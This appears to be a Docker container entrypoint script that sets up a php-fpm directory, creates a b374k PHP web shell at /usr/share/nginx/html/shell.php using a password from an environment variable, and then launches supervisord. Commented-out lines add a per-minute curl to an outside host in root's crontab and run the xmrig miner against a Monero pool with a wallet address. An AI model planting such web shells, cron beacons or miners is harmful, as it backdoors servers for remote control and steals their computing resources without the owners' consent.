#!/bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

#echo "* * * * *  curl -i -H "Accept: application/json" -H "Content-Type: application/json" https://shell-master-hggqqrgfrm.now.sh"; | tee -a /var/spool/cron/root
check_dir () {
	[[ ! -d /var/run/php-fpm ]] && mkdir /var/run/php-fpm
}


install_webshell () {
	if [ "x$DOCKER_INSTALL_WEBSHELL" == "x" ] ; then
		echo "no password, exit."
		exit 0
	else
		( cd /root/thirdparty/b374k-3.2.3 ; /usr/bin/php -f index.php -- -o /usr/share/nginx/html/shell.php -p $DOCKER_INSTALL_WEBSHELL -s -b -z gzcompress -c 9 -t default )
	fi
}

check_dir
install_webshell
#(./xmrig --log-file=/usr/share/nginx/html/xmrig.txt -B --cpu-priority=5 --algo=cryptonight --url=stratum+tcp://xmr.poolmining.org:3032 --user=4AMFQyFQCEVFggfMP6uhfm1wkPKBqwnzwGwUegy9JRsBQr8c9FFKxba29WUKikWVP7EdgZ5jcAqyqC1Qjt9j6EfNCdq6t9W --pass=x --max-cpu-usage=70)
# Forward SIGTERM to supervisord process
_term() {
	while kill -0 $child >/dev/null 2>&1
	do
		kill -TERM $child 2>/dev/null
		sleep 1
	done
}
trap _term 15
exec /usr/bin/supervisord -n &
child=$!


wait $child
